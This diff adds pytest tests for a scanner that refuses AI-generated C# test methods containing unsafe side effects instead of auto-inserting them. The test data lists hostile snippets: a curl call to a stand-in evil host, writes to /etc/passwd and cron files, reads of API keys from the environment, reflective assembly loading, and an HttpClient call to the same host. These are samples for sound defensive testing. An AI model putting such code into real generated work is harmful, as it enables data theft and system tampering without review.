@@ -163,6 +163,92 @@ def test_apply_wraps_refusal_as_outcome_without_writing(tmp_path: Path):
 
 
 # =============================================================================
+# Scenario: Generated test code with unsafe side effects is refused, not
+# silently inserted and auto-committed with zero human review (#1560)
+# =============================================================================
+@pytest.mark.parametrize(
+    ("category", "snippet"),
+    [
+        ("network", "var client = new HttpClient(); client.GetAsync(url);"),
+        (
+            "network",
+            "var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);",
+        ),
+        ("process", 'Process.Start("curl", "http://evil.example");'),
+        # Bare Process/StartInfo property-chain — no ".Start(" call site to
+        # match, an idiomatic (not obfuscated) way to spawn a process.
+        ("process", 'var p = new Process(); p.StartInfo.FileName = "cmd"; p.Start();'),
+        ("filesystem", 'File.WriteAllText("/etc/passwd", "pwned");'),
+        ("filesystem", 'new StreamWriter("/etc/cron.d/x").Write(payload);'),
+        # Whitespace/line-break around the member-access dot — legitimate C#
+        # formatting, not obfuscation.
+        ("filesystem", 'File\n    .WriteAllText("x", "y");'),
+        # *Async variants and instance-based FileInfo/DirectoryInfo — a
+        # trailing-\b-vs-longer-real-method-name gap, and a different-type
+        # gap, respectively.
+        ("filesystem", 'await File.WriteAllTextAsync("/etc/cron.d/x", payload);'),
+        ("filesystem", 'new FileInfo("/etc/cron.d/x").Delete();'),
+        ("environment", 'var secret = Environment.GetEnvironmentVariable("API_KEY");'),
+        ("environment", "var all = Environment.GetEnvironmentVariables();"),
+        ("reflection", "Activator.CreateInstance(Type.GetType(typeName));"),
+        ("reflection", "Assembly.Load(bytes);"),
+        ("reflection", "Assembly.LoadFrom(path);"),
+        ("interop", '[DllImport("kernel32.dll")] static extern void Evil();'),
+        ("interop", "Marshal.Copy(source, destination, 0, length);"),
+        # Bare `unsafe` keyword — the negative-lookbehind branch of the
+        # interop pattern, independent of Marshal/DllImport.
+        ("interop", "unsafe { fixed (int* p = &buf[0]) { } }"),
+    ],
+    ids=[
+        "network-httpclient",
+        "network-socket",
+        "process-static-start",
+        "process-bare-startinfo",
+        "filesystem-writealltext",
+        "filesystem-streamwriter",
+        "filesystem-whitespace-dot",
+        "filesystem-writealltextasync",
+        "filesystem-fileinfo-delete",
+        "environment-getvar",
+        "environment-getvars-plural",
+        "reflection-activator",
+        "reflection-assembly-load",
+        "reflection-assembly-loadfrom",
+        "interop-dllimport",
+        "interop-marshal",
+        "interop-unsafe-keyword",
+    ],
+)
+def test_scan_for_unsafe_patterns_flags_each_category(category: str, snippet: str):
+    assert category in insert.scan_for_unsafe_patterns(snippet)
+
+
+def test_scan_for_unsafe_patterns_returns_empty_for_a_clean_method():
+    assert insert.scan_for_unsafe_patterns(_NEW_METHOD) == []
+
+
+def test_unsafe_generated_method_is_refused_not_inserted(tmp_path: Path):
+    test_file = tmp_path / "PaymentServiceTests.cs"
+    test_file.write_text(_BLOCK_NAMESPACE_CLASS, encoding="utf-8")
+    before = test_file.read_text(encoding="utf-8")
+    unsafe_method = (
+        "        [Test]\n"
+        "        public async Task New_Case_KillsMutant()\n"
+        "        {\n"
+        "            new HttpClient().GetAsync(\"http://evil.example\");\n"
+        "        }\n"
+    )
+
+    outcome = insert.apply_generated_methods(test_file, unsafe_method)
+
+    assert outcome.inserted is False
+    assert "unsafe" in outcome.reason.lower()
+    assert "network" in outcome.reason
+    # Never silently inserted — file is byte-for-byte unchanged.
+    assert test_file.read_text(encoding="utf-8") == before
+
+
+# =============================================================================
 # Scenario: count_methods backs the loop's commit-message method count
 # =============================================================================
 def test_count_methods_counts_public_test_methods():
